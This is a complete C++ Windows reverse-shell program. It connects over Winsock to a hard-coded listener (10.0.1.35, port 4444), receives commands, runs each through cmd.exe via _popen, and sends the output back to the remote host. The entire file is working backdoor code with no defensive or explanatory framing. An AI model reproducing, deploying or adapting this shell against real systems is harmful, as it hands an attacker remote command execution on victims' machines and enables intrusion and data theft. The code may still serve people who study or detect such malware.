#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

void executeCommand(SOCKET sock) {
    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));

        // Receive command from listener
        int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
            break; // If connection closed or error
        }

        // Execute command using cmd.exe
        std::string command(buffer);
        FILE *fp = _popen(command.c_str(), "r");
        if (fp == NULL) {
            std::string errorMessage = "Failed to execute command.";
            send(sock, errorMessage.c_str(), errorMessage.length(), 0);
            continue;
        }

        // Read command output and send back to listener
        std::string result;
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            result.append(buffer);
        }
        _pclose(fp);

        // Send the output back to the listener
        send(sock, result.c_str(), result.length(), 0);
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char serverIP[] = "10.0.1.35";  // IP of the listener
    int serverPort = 4444;          // Port for the listener

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Winsock initialization failed" << std::endl;
        return 1;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return 1;
    }

    // Set up the server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP);

    // Connect to the listener
    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "Connection failed" << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to the server!" << std::endl;

    // Start executing commands
    executeCommand(sock);

    // Clean up
    closesocket(sock);
    WSACleanup();
    return 0;
}
